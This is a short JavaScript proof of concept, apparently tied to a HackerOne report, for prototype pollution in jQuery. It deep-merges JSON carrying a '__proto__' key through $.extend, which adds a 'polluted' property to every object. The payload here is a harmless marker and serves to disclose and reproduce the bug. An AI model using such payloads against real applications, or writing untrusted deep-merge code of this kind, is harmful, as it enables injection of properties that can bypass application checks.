//https://hackerone.com/reports/454365
 
  const { JSDOM } = require("jsdom");
  const { window } = new JSDOM("");
  const $ = require("jquery")(window);

  obj = {};

   

  $.extend(true, {}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
// End of file
